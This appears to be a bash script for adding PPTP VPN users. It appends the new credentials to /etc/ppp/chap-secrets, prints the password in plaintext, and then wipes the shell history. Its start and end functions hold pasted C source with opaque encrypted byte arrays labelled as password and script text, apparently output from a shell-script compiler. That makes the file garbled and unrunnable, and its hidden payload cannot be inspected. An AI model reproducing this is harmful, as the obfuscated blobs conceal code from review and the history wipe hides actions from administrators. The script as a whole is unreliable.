#!/bin/bash
myip=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0' | head -n1`;
myint=`ifconfig | grep -B1 "inet addr:$myip" | head -n1 | awk '{print $1}'`;
flag=0
start () {
#if 0
#endif
static  char data [] = 
#define      tst2_z	19
#define      tst2	((&data[0]))
	"\352\226\364\105\344\004\205\005\216\125\264\243\226\325\233\374"
	"\227\114\261\132\102\017\263"
#define      rlax_z	1
#define      rlax	((&data[23]))
	"\026"
#define      xecc_z	15
#define      xecc	((&data[25]))
	"\234\073\144\065\222\263\322\033\072\111\100\374\033\372\071\113"
#define      lsto_z	1
#define      lsto	((&data[40]))
	"\206"
#define      chk2_z	19
#define      chk2	((&data[41]))
	"\173\175\122\053\000\327\210\246\127\377\244\147\140\254\115\263"
	"\251\073\022\275"
#define      pswd_z	256
#define      pswd	((&data[113]))
	"\057\126\262\001\303\301\145\256\314\071\011\017\110\274\301\011"
	"\010\042\160\030\277\330\317\140\266\001\260\164\001\176\250\061"
	"\324\132\062\227\033\230\106\350\321\117\367\032\013\271\043\024"
	"\334\224\054\233\373\177\333\307\052\377\157\034\051\106\076\206"
	"\333\260\254\053\235\252\110\225\125\172\033\373\065\120\221\201"
	"\225\211\150\220\011\104\130\063\104\307\120\155\016\217\363\351"
	"\077\237\024\335\112\135\162\237\327\215\233\014\336\055\215\164"
	"\266\366\005\300\072\135\364\177\044\104\354\062\323\340\033\022"
	"\233"
#define      tst1_z	22
#define      tst1	((&data[385]))
	"\371\335\237\160\067\142\220\364\126\124\103\105\110\241\254\163"
	"\062\207\134\104\134\131\266\270\342\313\054\227\345"
#define      shll_z	10
#define      shll	((&data[411]))
	"\063\125\361\317\254\365\345\010\172\367"
#define      inlo_z	3
#define      inlo	((&data[421]))
	"\015\256\055"
#define      chk1_z	22
#define      chk1	((&data[428]))
	"\163\304\057\160\220\045\125\103\206\250\204\255\226\017\021\041"
	"\027\105\060\227\024\144\270\065\015\342"
#define      msg2_z	19
#define      msg2	((&data[453]))
	"\233\010\235\267\171\203\272\137\131\126\255\230\173\163\237\050"
	"\057\215\312\172\132\164\232\243"
#define      msg1_z	42
#define      msg1	((&data[476]))
	"\371\016\374\240\075\372\050\247\253\333\247\166\046\316\026\037"
	"\043\301\205\166\013\340\137\225\225\116\244\105\227\303\340\173"
	"\162\026\361\037\236\311\247\303\135\147\243\172\372\304\072"
#define      opts_z	1
#define      opts	((&data[521]))
	"\362"
#define      date_z	1
#define      date	((&data[522]))
	"\317"
#define      text_z	11549
#define      text	((&data[1444]))
	"\034\331\320\335\042\364\117\073\245\276\350\166\257\231\051\364"
	"\371\331\142\365\240\162\056\236\340\317\333\357\270\113\350\325"
	"\045\270\262\107\254\002\202\122\300\152\310\160\004\361\145\375"
	"\313\310\362\153\072\041\012\032\361\346\012\251\061\362\176\126"
	"\262\205\030\251\370\324\243\324\031\172\016\047\050\316\004\373"
	"\147\052\003\013\111\172\272\114\117"/* End of data[] */;
#define      hide_z	4096
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	1	/* Define as 1 to enable ptrace the executable */
/* rtc.c */
#include <sys/stat.h>
#include <sys/types.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#if !TRACEABLE
#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>
#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
#	define PTRACE_ATTACH	PT_ATTACH
#endif
}
read -p "New Username: " USER
read -p "Password for ($USER): " PASS

echo "$USER pptpd $PASS *" >> /etc/ppp/chap-secrets

echo ""
echo -e "\e[0;36m-----------------------------------\e[0;0m"
echo "Login PPTP VPN details:"
echo -e "\e[0;36m-----------------------------------\e[0;0m" 
echo "Username: $USER"
echo "Password: $PASS"
echo -e "\e[0;36m-----------------------------------\e[0;0m"
cd ~/
cat /dev/null > ~/.bash_history && history -c
end () {
#if 0
#endif
static  char data [] = 
#define      tst2_z	19
#define      tst2	((&data[0]))
	"\352\226\364\105\344\004\205\005\216\125\264\243\226\325\233\374"
	"\227\114\261\132\102\017\263"
#define      rlax_z	1
#define      rlax	((&data[23]))
	"\026"
#define      xecc_z	15
#define      xecc	((&data[25]))
	"\234\073\144\065\222\263\322\033\072\111\100\374\033\372\071\113"
#define      lsto_z	1
#define      lsto	((&data[40]))
	"\206"
#define      chk2_z	19
#define      chk2	((&data[41]))
	"\173\175\122\053\000\327\210\246\127\377\244\147\140\254\115\263"
	"\251\073\022\275"
#define      pswd_z	256
#define      pswd	((&data[113]))
	"\057\126\262\001\303\301\145\256\314\071\011\017\110\274\301\011"
	"\010\042\160\030\277\330\317\140\266\001\260\164\001\176\250\061"
	"\324\132\062\227\033\230\106\350\321\117\367\032\013\271\043\024"
	"\334\224\054\233\373\177\333\307\052\377\157\034\051\106\076\206"
	"\333\260\254\053\235\252\110\225\125\172\033\373\065\120\221\201"
	"\225\211\150\220\011\104\130\063\104\307\120\155\016\217\363\351"
	"\077\237\024\335\112\135\162\237\327\215\233\014\336\055\215\164"
	"\266\366\005\300\072\135\364\177\044\104\354\062\323\340\033\022"
	"\233"
#define      tst1_z	22
#define      tst1	((&data[385]))
	"\371\335\237\160\067\142\220\364\126\124\103\105\110\241\254\163"
	"\062\207\134\104\134\131\266\270\342\313\054\227\345"
#define      shll_z	10
#define      shll	((&data[411]))
	"\063\125\361\317\254\365\345\010\172\367"
#define      inlo_z	3
#define      inlo	((&data[421]))
	"\015\256\055"
#define      chk1_z	22
#define      chk1	((&data[428]))
	"\163\304\057\160\220\045\125\103\206\250\204\255\226\017\021\041"
	"\027\105\060\227\024\144\270\065\015\342"
#define      msg2_z	19
#define      msg2	((&data[453]))
	"\233\010\235\267\171\203\272\137\131\126\255\230\173\163\237\050"
	"\057\215\312\172\132\164\232\243"
#define      msg1_z	42
#define      msg1	((&data[476]))
	"\371\016\374\240\075\372\050\247\253\333\247\166\046\316\026\037"
	"\043\301\205\166\013\340\137\225\225\116\244\105\227\303\340\173"
	"\162\026\361\037\236\311\247\303\135\147\243\172\372\304\072"
#define      opts_z	1
#define      opts	((&data[521]))
	"\362"
#define      date_z	1
#define      date	((&data[522]))
	"\317"
#define      text_z	11549
#define      text	((&data[1444]))
	"\034\331\320\335\042\364\117\073\245\276\350\166\257\231\051\364"
	"\371\331\142\365\240\162\056\236\340\317\333\357\270\113\350\325"
	"\045\270\262\107\254\002\202\122\300\152\310\160\004\361\145\375"
	"\313\310\362\153\072\041\012\032\361\346\012\251\061\362\176\126"
	"\262\205\030\251\370\324\243\324\031\172\016\047\050\316\004\373"
	"\147\052\003\013\111\172\272\114\117"/* End of data[] */;
#define      hide_z	4096
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	1	/* Define as 1 to enable ptrace the executable */
/* rtc.c */
#include <sys/stat.h>
#include <sys/types.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#if !TRACEABLE
#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>
#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
#	define PTRACE_ATTACH	PT_ATTACH
#endif
}